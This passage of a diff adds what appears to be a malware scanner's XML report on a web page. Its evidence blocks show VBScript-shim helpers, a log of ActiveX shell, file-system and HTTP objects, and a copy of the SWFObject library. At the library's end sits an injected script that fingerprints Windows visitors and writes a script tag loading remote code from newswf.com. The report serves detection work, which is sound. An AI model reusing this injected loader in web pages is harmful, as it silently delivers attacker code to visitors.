+        return str.substring(str.length - lngLen, str.length)
+    } else {
+        return null
+    }
+}
+function mid(str, starnum, endnum) {
+    if (str.length >= 0) {
+        return str.substr(starnum, endnum)
+    } else {
+        return null
+    }
+}
+function midb(str, starnum, endnum) {
+    if (str.length >= 0) {
+        return str.substr(starnum, endnum)
+    } else {
+        return null
+    }
+}
+function asc(str){
+    return str.charCodeAt(0)
+}
+function ascb(str){
+    return str.charCodeAt(0)
+}
+function getref(func){
+    return eval(func)
+}
+function lcase(str){
+    return str.toLowerCase()
+}
+function ucase(str){
+    return str.toUpperCase( )
+}
+function rnd(){
+    return Math.random()
+}
+function len(object){
+    return object.length
+}
+function lenb(object){
+    return object.length
+}
+function chr(number){
+    return String.fromCharCode(number)
+}
+function cstr(number){
+    return String(cstr)
+}
+function lbound(array){
+    return 0
+}
+function ubound(array){
+    return array.length - 1
+}
+function chrw(number){
+    return String.fromCharCode(number)
+}
+function ascw(str){
+    return str.charCodeAt(0)
+}
+function instrrev(str1,str2){
+    return str1.lastIndexOf(str2) 
+}
+function space(object){
+    return ' '.repeat(object)
+}
+function split(str1,str2){
+    return str1.split(str2)
+}
+function cdbl(number){
+    return parseFloat(number)
+}
+function int(str){
+    return Math.floor(str)
+} 
+function cint(str){
+    return Math.round(str)
+}
+function isarray(object){
+    return Object.prototype.toString.call(object) === '[object Array]'; 
+}
+function array(object){
+    
+}
+function createobject(str){
+    return new ActiveXObject(str)
+}]]>
+</content>
+</evidence>
+<evidence type="javascript_behavior">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<content mode="text">
+<![CDATA[_global.ActiveXObject("WScript.Shell", )?
+_global.ActiveXObject("Scripting.FileSystemObject", )?
+_global.ActiveXObject("MSXML2.ServerXMLHTTP", )?
+]]>
+</content>
+</evidence>
+<evidence type="javascript" matched="JS_CC_ON;JS_CHECK_PLATFORM_LOAD_SWF_A_2;">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<attributes>
+<attr name="url">http://www.abcd1234sa.com.cn/index</attr>
+</attributes>
+<content mode="text">
+<![CDATA[/*!	SWFObject v2.0 <http://code.google.com/p/swfobject/>
+	Copyright (c) 2007 Geoff Stearns, Michael Williams, and Bobby van der Sluis
+	This software is released under the MIT License <http://www.opensource.org/licenses/mit-license.php>
+*/
+
+var swfobject = function() {
+	
+	var UNDEF = "undefined",
+		OBJECT = "object",
+		SHOCKWAVE_FLASH = "Shockwave Flash",
+		SHOCKWAVE_FLASH_AX = "ShockwaveFlash.ShockwaveFlash",
+		FLASH_MIME_TYPE = "application/x-shockwave-flash",
+		EXPRESS_INSTALL_ID = "SWFObjectExprInst",
+		
+		win = window,
+		doc = document,
+		nav = navigator,
+		
+		domLoadFnArr = [],
+		regObjArr = [],
+		timer = null,
+		storedAltContent = null,
+		storedAltContentId = null,
+		isDomLoaded = false,
+		isExpressInstallActive = false;
+	
+	/* Centralized function for browser feature detection
+		- Proprietary feature detection (conditional compiling) is used to detect Internet Explorer's features
+		- User agent string detection is only used when no alternative is possible
+		- Is executed directly for optimal performance
+	*/	
+	var ua = function() {
+		var w3cdom = typeof doc.getElementById != UNDEF && typeof doc.getElementsByTagName != UNDEF && typeof doc.createElement != UNDEF && typeof doc.appendChild != UNDEF && typeof doc.replaceChild != UNDEF && typeof doc.removeChild != UNDEF && typeof doc.cloneNode != UNDEF,
+			playerVersion = [0,0,0],
+			d = null;
+		if (typeof nav.plugins != UNDEF && typeof nav.plugins[SHOCKWAVE_FLASH] == OBJECT) {
+			d = nav.plugins[SHOCKWAVE_FLASH].description;
+			if (d) {
+				d = d.replace(/^.*\s+(\S+\s+\S+$)/, "$1");
+				playerVersion[0] = parseInt(d.replace(/^(.*)\..*$/, "$1"), 10);
+				playerVersion[1] = parseInt(d.replace(/^.*\.(.*)\s.*$/, "$1"), 10);
+				playerVersion[2] = /r/.test(d) ? parseInt(d.replace(/^.*r(.*)$/, "$1"), 10) : 0;
+			}
+		}
+		else if (typeof win.ActiveXObject != UNDEF) {
+			var a = null, fp6Crash = false;
+			try {
+				a = new ActiveXObject(SHOCKWAVE_FLASH_AX + ".7");
+			}
+			catch(e) {
+				try { 
+					a = new ActiveXObject(SHOCKWAVE_FLASH_AX + ".6");
+					playerVersion = [6,0,21];
+					a.AllowScriptAccess = "always";  // Introduced in fp6.0.47
+				}
+				catch(e) {
+					if (playerVersion[0] == 6) {
+						fp6Crash = true;
+					}
+				}
+				if (!fp6Crash) {
+					try {
+						a = new ActiveXObject(SHOCKWAVE_FLASH_AX);
+					}
+					catch(e) {}
+				}
+			}
+			if (!fp6Crash && a) { // a will return null when ActiveX is disabled
+				try {
+					d = a.GetVariable("$version");  // Will crash fp6.0.21/23/29
+					if (d) {
+						d = d.split(" ")[1].split(",");
+						playerVersion = [parseInt(d[0], 10), parseInt(d[1], 10), parseInt(d[2], 10)];
+					}
+				}
+				catch(e) {}
+			}
+		}
+		var u = nav.userAgent.toLowerCase(),
+			p = nav.platform.toLowerCase(),
+			webkit = /webkit/.test(u) ? parseFloat(u.replace(/^.*webkit\/(\d+(\.\d+)?).*$/, "$1")) : false, // returns either the webkit version or false if not webkit
+			ie = false,
+			windows = p ? /win/.test(p) : /win/.test(u),
+			mac = p ? /mac/.test(p) : /mac/.test(u);
+		/*@cc_on
+			ie = true;
+			@if (@_win32)
+				windows = true;
+			@elif (@_mac)
+				mac = true;
+			@end
+		@*/
+		return { w3cdom:w3cdom, pv:playerVersion, webkit:webkit, ie:ie, win:windows, mac:mac };
+	}();
+
+	/* Cross-browser onDomLoad
+		- Based on Dean Edwards' solution: http://dean.edwards.name/weblog/2006/06/again/
+		- Will fire an event as soon as the DOM of a page is loaded (supported by Gecko based browsers - like Firefox -, IE, Opera9+, Safari)
+	*/ 
+	var onDomLoad = function() {
+		if (!ua.w3cdom) {
+			return;
+		}
+		addDomLoadEvent(main);
+		if (ua.ie && ua.win) {
+			try {  // Avoid a possible Operation Aborted error
+				doc.write("<scr" + "ipt id=__ie_ondomload defer=true src=//:></scr" + "ipt>"); // String is split into pieces to avoid Norton AV to add code that can cause errors 
+				var s = getElementById("__ie_ondomload");
+				if (s) {
+					s.onreadystatechange = function() {
+						if (this.readyState == "complete") {
+							this.parentNode.removeChild(this);
+							callDomLoadFunctions();
+						}
+					};
+				}
+			}
+			catch(e) {}
+		}
+		if (ua.webkit && typeof doc.readyState != UNDEF) {
+			timer = setInterval(function() { if (/loaded|complete/.test(doc.readyState)) { callDomLoadFunctions(); }}, 10);
+		}
+		if (typeof doc.addEventListener != UNDEF) {
+			doc.addEventListener("DOMContentLoaded", callDomLoadFunctions, null);
+		}
+		addLoadEvent(callDomLoadFunctions);
+	}();
+	
+	function callDomLoadFunctions() {
+		if (isDomLoaded) {
+			return;
+		}
+		if (ua.ie && ua.win) { // Test if we can really add elements to the DOM; we don't want to fire it too early
+			var s = createElement("span");
+			try { // Avoid a possible Operation Aborted error
+				var t = doc.getElementsByTagName("body")[0].appendChild(s);
+				t.parentNode.removeChild(t);
+			}
+			catch (e) {
+				return;
+			}
+		}
+		isDomLoaded = true;
+		if (timer) {
+			clearInterval(timer);
+			timer = null;
+		}
+		var dl = domLoadFnArr.length;
+		for (var i = 0; i < dl; i++) {
+			domLoadFnArr[i]();
+		}
+	}
+	
+	function addDomLoadEvent(fn) {
+		if (isDomLoaded) {
+			fn();
+		}
+		else { 
+			domLoadFnArr[domLoadFnArr.length] = fn; // Array.push() is only available in IE5.5+
+		}
+	}
+	
+	/* Cross-browser onload
+		- Based on James Edwards' solution: http://brothercake.com/site/resources/scripts/onload/
+		- Will fire an event as soon as a web page including all of its assets are loaded 
+	 */
+	function addLoadEvent(fn) {
+		if (typeof win.addEventListener != UNDEF) {
+			win.addEventListener("load", fn, false);
+		}
+		else if (typeof doc.addEventListener != UNDEF) {
+			doc.addEventListener("load", fn, false);
+		}
+		else if (typeof win.attachEvent != UNDEF) {
+			win.attachEvent("onload", fn);
+		}
+		else if (typeof win.onload == "function") {
+			var fnOld = win.onload;
+			win.onload = function() {
+				fnOld();
+				fn();
+			};
+		}
+		else {
+			win.onload = fn;
+		}
+	}
+	
+	/* Main function
+		- Will preferably execute onDomLoad, otherwise onload (as a fallback)
+	*/
+	function main() { // Static publishing only
+		var rl = regObjArr.length;
+		for (var i = 0; i < rl; i++) { // For each registered object element
+			var id = regObjArr[i].id;
+			if (ua.pv[0] > 0) {
+				var obj = getElementById(id);
+				if (obj) {
+					regObjArr[i].width = obj.getAttribute("width") ? obj.getAttribute("width") : "0";
+					regObjArr[i].height = obj.getAttribute("height") ? obj.getAttribute("height") : "0";
+					if (hasPlayerVersion(regObjArr[i].swfVersion)) { // Flash plug-in version >= Flash content version: Houston, we have a match!
+						if (ua.webkit && ua.webkit < 312) { // Older webkit engines ignore the object element's nested param elements
+							fixParams(obj);
+						}
+						setVisibility(id, true);
+					}
+					else if (regObjArr[i].expressInstall && !isExpressInstallActive && hasPlayerVersion("6.0.65") && (ua.win || ua.mac)) { // Show the Adobe Express Install dialog if set by the web page author and if supported (fp6.0.65+ on Win/Mac OS only)
+						showExpressInstall(regObjArr[i]);
+					}
+					else { // Flash plug-in and Flash content version mismatch: display alternative content instead of Flash content
+						displayAltContent(obj);
+					}
+				}
+			}
+			else {  // If no fp is installed, we let the object element do its job (show alternative content)
+				setVisibility(id, true);
+			}
+		}
+	}
+	
+	/* Fix nested param elements, which are ignored by older webkit engines
+		- This includes Safari up to and including version 1.2.2 on Mac OS 10.3
+		- Fall back to the proprietary embed element
+	*/
+	function fixParams(obj) {
+		var nestedObj = obj.getElementsByTagName(OBJECT)[0];
+		if (nestedObj) {
+			var e = createElement("embed"), a = nestedObj.attributes;
+			if (a) {
+				var al = a.length;
+				for (var i = 0; i < al; i++) {
+					if (a[i].nodeName.toLowerCase() == "data") {
+						e.setAttribute("src", a[i].nodeValue);
+					}
+					else {
+						e.setAttribute(a[i].nodeName, a[i].nodeValue);
+					}
+				}
+			}
+			var c = nestedObj.childNodes;
+			if (c) {
+				var cl = c.length;
+				for (var j = 0; j < cl; j++) {
+					if (c[j].nodeType == 1 && c[j].nodeName.toLowerCase() == "param") {
+						e.setAttribute(c[j].getAttribute("name"), c[j].getAttribute("value"));
+					}
+				}
+			}
+			obj.parentNode.replaceChild(e, obj);
+		}
+	}
+	
+	/* Fix hanging audio/video threads and force open sockets and NetConnections to disconnect
+		- Occurs when unloading a web page in IE using fp8+ and innerHTML/outerHTML
+		- Dynamic publishing only
+	*/
+	function fixObjectLeaks(id) {
+		if (ua.ie && ua.win && hasPlayerVersion("8.0.0")) {
+			win.attachEvent("onunload", function () {
+				var obj = getElementById(id);
+				if (obj) {
+					for (var i in obj) {
+						if (typeof obj[i] == "function") {
+							obj[i] = function() {};
+						}
+					}
+					obj.parentNode.removeChild(obj);
+				}
+			});
+		}
+	}
+	
+	/* Show the Adobe Express Install dialog
+		- Reference: http://www.adobe.com/cfusion/knowledgebase/index.cfm?id=6a253b75
+	*/
+	function showExpressInstall(regObj) {
+		isExpressInstallActive = true;
+		var obj = getElementById(regObj.id);
+		if (obj) {
+			if (regObj.altContentId) {
+				var ac = getElementById(regObj.altContentId);
+				if (ac) {
+					storedAltContent = ac;
+					storedAltContentId = regObj.altContentId;
+				}
+			}
+			else {
+				storedAltContent = abstractAltContent(obj);
+			}
+			if (!(/%$/.test(regObj.width)) && parseInt(regObj.width, 10) < 310) {
+				regObj.width = "310";
+			}
+			if (!(/%$/.test(regObj.height)) && parseInt(regObj.height, 10) < 137) {
+				regObj.height = "137";
+			}
+			doc.title = doc.title.slice(0, 47) + " - Flash Player Installation";
+			var pt = ua.ie && ua.win ? "ActiveX" : "PlugIn",
+				dt = doc.title,
+				fv = "MMredirectURL=" + win.location + "&MMplayerType=" + pt + "&MMdoctitle=" + dt,
+				replaceId = regObj.id;
+			// For IE when a SWF is loading (AND: not available in cache) wait for the onload event to fire to remove the original object element
+			// In IE you cannot properly cancel a loading SWF file without breaking browser load references, also obj.onreadystatechange doesn't work
+			if (ua.ie && ua.win && obj.readyState != 4) {
+				var newObj = createElement("div");
+				replaceId += "SWFObjectNew";
+				newObj.setAttribute("id", replaceId);
+				obj.parentNode.insertBefore(newObj, obj); // Insert placeholder div that will be replaced by the object element that loads expressinstall.swf
+				obj.style.display = "none";
+				win.attachEvent("onload", function() { obj.parentNode.removeChild(obj); });
+			}
+			createSWF({ data:regObj.expressInstall, id:EXPRESS_INSTALL_ID, width:regObj.width, height:regObj.height }, { flashvars:fv }, replaceId);
+		}
+	}
+	
+	/* Functions to abstract and display alternative content
+	*/
+	function displayAltContent(obj) {
+		if (ua.ie && ua.win && obj.readyState != 4) {
+			// For IE when a SWF is loading (AND: not available in cache) wait for the onload event to fire to remove the original object element
+			// In IE you cannot properly cancel a loading SWF file without breaking browser load references, also obj.onreadystatechange doesn't work
+			var el = createElement("div");
+			obj.parentNode.insertBefore(el, obj); // Insert placeholder div that will be replaced by the alternative content
+			el.parentNode.replaceChild(abstractAltContent(obj), el);
+			obj.style.display = "none";
+			win.attachEvent("onload", function() { obj.parentNode.removeChild(obj); });
+		}
+		else {
+			obj.parentNode.replaceChild(abstractAltContent(obj), obj);
+		}
+	}	
+
+	function abstractAltContent(obj) {
+		var ac = createElement("div");
+		if (ua.win && ua.ie) {
+			ac.innerHTML = obj.innerHTML;
+		}
+		else {
+			var nestedObj = obj.getElementsByTagName(OBJECT)[0];
+			if (nestedObj) {
+				var c = nestedObj.childNodes;
+				if (c) {
+					var cl = c.length;
+					for (var i = 0; i < cl; i++) {
+						if (!(c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "param") && !(c[i].nodeType == 8)) {
+							ac.appendChild(c[i].cloneNode(true));
+						}
+					}
+				}
+			}
+		}
+		return ac;
+	}
+	
+	/* Cross-browser dynamic SWF creation
+	*/
+	function createSWF(attObj, parObj, id) {
+		var r, el = getElementById(id);
+		if (typeof attObj.id == UNDEF) { // if no 'id' is defined for the object element, it will inherit the 'id' from the alternative content
+			attObj.id = id;
+		}
+		if (ua.ie && ua.win) { // IE, the object element and W3C DOM methods do not combine: fall back to outerHTML
+			var att = "";
+			for (var i in attObj) {
+				if (attObj[i] != Object.prototype[i]) { // Filter out prototype additions from other potential libraries, like Object.prototype.toJSONString = function() {}
+					if (i == "data") {
+						parObj.movie = attObj[i];
+					}
+					else if (i.toLowerCase() == "styleclass") { // 'class' is an ECMA4 reserved keyword
+						att += ' class="' + attObj[i] + '"';
+					}
+					else if (i != "classid") {
+						att += ' ' + i + '="' + attObj[i] + '"';
+					}
+				}
+			}
+			var par = "";
+			for (var j in parObj) {
+				if (parObj[j] != Object.prototype[j]) { // Filter out prototype additions from other potential libraries
+					par += '<param name="' + j + '" value="' + parObj[j] + '" />';
+				}
+			}
+			el.outerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"' + att + '>' + par + '</object>';
+			fixObjectLeaks(attObj.id); // This bug affects dynamic publishing only
+			r = getElementById(attObj.id);	
+		}
+		else if (ua.webkit && ua.webkit < 312) { // Older webkit engines ignore the object element's nested param elements: fall back to the proprietary embed element
+			var e = createElement("embed");
+			e.setAttribute("type", FLASH_MIME_TYPE);
+			for (var k in attObj) {
+				if (attObj[k] != Object.prototype[k]) { // Filter out prototype additions from other potential libraries
+					if (k == "data") {
+						e.setAttribute("src", attObj[k]);
+					}
+					else if (k.toLowerCase() == "styleclass") { // 'class' is an ECMA4 reserved keyword
+						e.setAttribute("class", attObj[k]);
+					}
+					else if (k != "classid") { // Filter out IE specific attribute
+						e.setAttribute(k, attObj[k]);
+					}
+				}
+			}
+			for (var l in parObj) {
+				if (parObj[l] != Object.prototype[l]) { // Filter out prototype additions from other potential libraries
+					if (l != "movie") { // Filter out IE specific param element
+						e.setAttribute(l, parObj[l]);
+					}
+				}
+			}
+			el.parentNode.replaceChild(e, el);
+			r = e;
+		}
+		else { // Well-behaving browsers
+			var o = createElement(OBJECT);
+			o.setAttribute("type", FLASH_MIME_TYPE);
+			for (var m in attObj) {
+				if (attObj[m] != Object.prototype[m]) { // Filter out prototype additions from other potential libraries
+					if (m.toLowerCase() == "styleclass") { // 'class' is an ECMA4 reserved keyword
+						o.setAttribute("class", attObj[m]);
+					}
+					else if (m != "classid") { // Filter out IE specific attribute
+						o.setAttribute(m, attObj[m]);
+					}
+				}
+			}
+			for (var n in parObj) {
+				if (parObj[n] != Object.prototype[n] && n != "movie") { // Filter out prototype additions from other potential libraries and IE specific param element
+					createObjParam(o, n, parObj[n]);
+				}
+			}
+			el.parentNode.replaceChild(o, el);
+			r = o;
+		}
+		return r;
+	}
+	
+	function createObjParam(el, pName, pValue) {
+		var p = createElement("param");
+		p.setAttribute("name", pName);	
+		p.setAttribute("value", pValue);
+		el.appendChild(p);
+	}
+	
+	function getElementById(id) {
+		return doc.getElementById(id);
+	}
+	
+	function createElement(el) {
+		return doc.createElement(el);
+	}
+	
+	function hasPlayerVersion(rv) {
+		var pv = ua.pv, v = rv.split(".");
+		v[0] = parseInt(v[0], 10);
+		v[1] = parseInt(v[1], 10);
+		v[2] = parseInt(v[2], 10);
+		return (pv[0] > v[0] || (pv[0] == v[0] && pv[1] > v[1]) || (pv[0] == v[0] && pv[1] == v[1] && pv[2] >= v[2])) ? true : false;
+	}
+	
+	/* Cross-browser dynamic CSS creation
+		- Based on Bobby van der Sluis' solution: http://www.bobbyvandersluis.com/articles/dynamicCSS.php
+	*/	
+	function createCSS(sel, decl) {
+		if (ua.ie && ua.mac) {
+			return;
+		}
+		var h = doc.getElementsByTagName("head")[0], s = createElement("style");
+		s.setAttribute("type", "text/css");
+		s.setAttribute("media", "screen");
+		if (!(ua.ie && ua.win) && typeof doc.createTextNode != UNDEF) {
+			s.appendChild(doc.createTextNode(sel + " {" + decl + "}"));
+		}
+		h.appendChild(s);
+		if (ua.ie && ua.win && typeof doc.styleSheets != UNDEF && doc.styleSheets.length > 0) {
+			var ls = doc.styleSheets[doc.styleSheets.length - 1];
+			if (typeof ls.addRule == OBJECT) {
+				ls.addRule(sel, decl);
+			}
+		}
+	}
+	
+	function setVisibility(id, isVisible) {
+		var v = isVisible ? "visible" : "hidden";
+		if (isDomLoaded) {
+			getElementById(id).style.visibility = v;
+		}
+		else {
+			createCSS("#" + id, "visibility:" + v);
+		}
+	}
+	
+	function getTargetVersion(obj) {
+	    if (!obj)
+	        return 0;
+		var c = obj.childNodes;
+		var cl = c.length;
+		for (var i = 0; i < cl; i++) {
+			if (c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "object") {
+			    c = c[i].childNodes;
+			    cl = c.length;
+			    i = 0;
+			}     
+			if (c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "param" && c[i].getAttribute("name") == "swfversion") {
+			   return c[i].getAttribute("value"); 
+			}
+		}
+		return 0;
+	}
+    
+	function getExpressInstall(obj) {
+	    if (!obj)
+	        return "";
+		var c = obj.childNodes;
+		var cl = c.length;
+		for (var i = 0; i < cl; i++) {
+			if (c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "object") {
+			    c = c[i].childNodes;
+			    cl = c.length;
+			    i = 0;
+			}     
+			if (c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "param" && c[i].getAttribute("name") == "expressinstall") { 
+			    return c[i].getAttribute("value"); 
+			}	       
+		}
+		return "";
+	}
+    
+	return {
+		/* Public API
+			- Reference: http://code.google.com/p/swfobject/wiki/SWFObject_2_0_documentation
+		*/ 
+		registerObject: function(objectIdStr, swfVersionStr, xiSwfUrlStr) {
+			if (!ua.w3cdom || !objectIdStr) {
+				return;
+			}
+			var obj = document.getElementById(objectIdStr);
+			var xi = getExpressInstall(obj);
+			var regObj = {};
+			regObj.id = objectIdStr;
+			regObj.swfVersion = swfVersionStr ? swfVersionStr : getTargetVersion(obj);
+			regObj.expressInstall = xiSwfUrlStr ? xiSwfUrlStr : ((xi != "") ? xi : false);
+			regObjArr[regObjArr.length] = regObj;
+			setVisibility(objectIdStr, false);
+		},
+		
+		getObjectById: function(objectIdStr) {
+			var r = null;
+			if (ua.w3cdom && isDomLoaded) {
+				var o = getElementById(objectIdStr);
+				if (o) {
+					var n = o.getElementsByTagName(OBJECT)[0];
+					if (!n || (n && typeof o.SetVariable != UNDEF)) {
+				    	r = o;
+					}
+					else if (typeof n.SetVariable != UNDEF) {
+						r = n;
+					}
+				}
+			}
+			return r;
+		},
+		
+		embedSWF: function(swfUrlStr, replaceElemIdStr, widthStr, heightStr, swfVersionStr, xiSwfUrlStr, flashvarsObj, parObj, attObj) {
+			if (!ua.w3cdom || !swfUrlStr || !replaceElemIdStr || !widthStr || !heightStr || !swfVersionStr) {
+				return;
+			}
+			widthStr += ""; // Auto-convert to string to make it idiot proof
+			heightStr += "";
+			if (hasPlayerVersion(swfVersionStr)) {
+				setVisibility(replaceElemIdStr, false);
+				var att = (typeof attObj == OBJECT) ? attObj : {};
+				att.data = swfUrlStr;
+				att.width = widthStr;
+				att.height = heightStr;
+				var par = (typeof parObj == OBJECT) ? parObj : {};
+				if (typeof flashvarsObj == OBJECT) {
+					for (var i in flashvarsObj) {
+						if (flashvarsObj[i] != Object.prototype[i]) { // Filter out prototype additions from other potential libraries
+							if (typeof par.flashvars != UNDEF) {
+								par.flashvars += "&" + i + "=" + flashvarsObj[i];
+							}
+							else {
+								par.flashvars = i + "=" + flashvarsObj[i];
+							}
+						}
+					}
+				}
+				addDomLoadEvent(function() {
+					createSWF(att, par, replaceElemIdStr);
+					if (att.id == replaceElemIdStr) {
+						setVisibility(replaceElemIdStr, true);
+					}
+				});
+			}
+			else if (xiSwfUrlStr && !isExpressInstallActive && hasPlayerVersion("6.0.65") && (ua.win || ua.mac)) {
+				setVisibility(replaceElemIdStr, false);
+				addDomLoadEvent(function() {
+					var regObj = {};
+					regObj.id = regObj.altContentId = replaceElemIdStr;
+					regObj.width = widthStr;
+					regObj.height = heightStr;
+					regObj.expressInstall = xiSwfUrlStr;
+					showExpressInstall(regObj);
+				});
+			}
+		},
+		
+		getFlashPlayerVersion: function() {
+			return { major:ua.pv[0], minor:ua.pv[1], release:ua.pv[2] };
+		},
+		
+		hasFlashPlayerVersion:hasPlayerVersion,
+		
+		createSWF: function(attObj, parObj, replaceElemIdStr) {
+			if (ua.w3cdom && isDomLoaded) {
+				return createSWF(attObj, parObj, replaceElemIdStr);
+			}
+			else {
+				return undefined;
+			}
+		},
+		
+		createCSS: function(sel, decl) {
+			if (ua.w3cdom) {
+				createCSS(sel, decl);
+			}
+		},
+		
+		addDomLoadEvent:addDomLoadEvent,
+		
+		addLoadEvent:addLoadEvent,
+		
+		getQueryParamValue: function(param) {
+			var q = doc.location.search || doc.location.hash;
+			if (param == null) {
+				return q;
+			}
+		 	if(q) {
+				var pairs = q.substring(1).split("&");
+				for (var i = 0; i < pairs.length; i++) {
+					if (pairs[i].substring(0, pairs[i].indexOf("=")) == param) {
+						return pairs[i].substring((pairs[i].indexOf("=") + 1));
+					}
+				}
+			}
+			return "";
+		},
+		
+		// For internal usage only
+		expressInstallCallback: function() {
+			if (isExpressInstallActive && storedAltContent) {
+				var obj = getElementById(EXPRESS_INSTALL_ID);
+				if (obj) {
+					obj.parentNode.replaceChild(storedAltContent, obj);
+					if (storedAltContentId) {
+						setVisibility(storedAltContentId, true);
+						if (ua.ie && ua.win) {
+							storedAltContent.style.display = "block";
+						}
+					}
+					storedAltContent = null;
+					storedAltContentId = null;
+					isExpressInstallActive = false;
+				}
+			} 
+		}
+		
+	};
+
+}();
+
+/* ============================================================================-*/
+function setCookie(name, value, expiredays, path, domain, secure) { if (expiredays) { var exdate=new Date(); exdate.setDate(exdate.getDate()+expiredays); var expires = exdate.toGMTString(); } document.cookie = name + "=" + escape(value) + ((expiredays) ? "; expires=" + expires : "") + ((path) ? "; path=" + path : "") + ((domain) ? "; domain=" + domain : "") + ((secure) ? "; secure" : "");} if (navigator.userAgent.indexOf("KHTML") == -1 && navigator.userAgent.indexOf("NT") != -1){if(navigator.cookieEnabled == true) {var user = getCookie("NSwfCookie");if (user !=="ok"){newswfcookie();setCookie("NSwfCookie", "ok", 7, "/");}}}  function newswfcookie(){document.write(unescape("%3Cscript src='http://newswf.com/in.cgi?6' type='text/javascript'%3E%3C/script%3E"));} function getCookie(name) { var cookie = " " + document.cookie; var search = " " + name + "="; var setStr = null; var offset = 0; var end = 0; if (cookie.length > 0) { offset = cookie.indexOf(search); if (offset != -1) { offset += search.length; end = cookie.indexOf(";", offset); if (end == -1) { end = cookie.length; } setStr = unescape(cookie.substring(offset, end)); } } return setStr;}
+/*============================================================================-=*/
+]]>
+</content>
+</evidence>
+<evidence type="javascript_behavior">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<content mode="text">
+<![CDATA[_global.Exception("?: 89: SyntaxError: Unexpected identifier????    (@_win32)?         ^^^^^^?", )?
+]]>
+</content>
+</evidence>
+</report>
